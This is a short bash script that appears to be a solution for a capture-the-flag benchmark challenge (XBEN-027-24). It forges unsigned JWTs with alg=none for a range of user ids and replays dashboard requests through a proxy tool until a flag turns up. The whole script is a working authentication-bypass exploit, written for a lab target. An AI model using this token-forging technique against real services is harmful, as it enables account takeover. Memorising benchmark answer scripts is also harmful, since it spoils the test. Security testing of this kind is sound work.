#!/usr/bin/env bash
# XBEN-027-24 — JWT with the signature unverified and alg=none accepted.
# Proxy-mode twin. Log in for a session, then replay /dashboard with an
# unsigned (alg=none) auth_token minted for each candidate user id until one is
# the flag holder. The signature is never checked, so no key is needed.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben027p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/"; BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/password/test' --set 'form.password=test' >/dev/null
for uid in $(seq 10000 10050); do
  tok="$(python3 -I -c "import base64,json;b=lambda x:base64.urlsafe_b64encode(x).rstrip(b'=').decode();print(b(json.dumps({'alg':'none','typ':'JWT'}).encode())+'.'+b(json.dumps({'username':'x','user_id':$uid,'user_type':'customer'}).encode())+'.')")"
  "$H5I" websec replay "$BASE" --create --session "$SESSION" \
    --set 'method=GET' --set 'path=/dashboard' --set "cookie.auth_token=$tok" >/dev/null 2>&1 || true
  "$H5I" websec match --all --session "$SESSION" --regex "$FLAG_RE" 2>/dev/null | grep -oE "$FLAG_RE" | head -1 | grep . && exit 0
done
print_flag
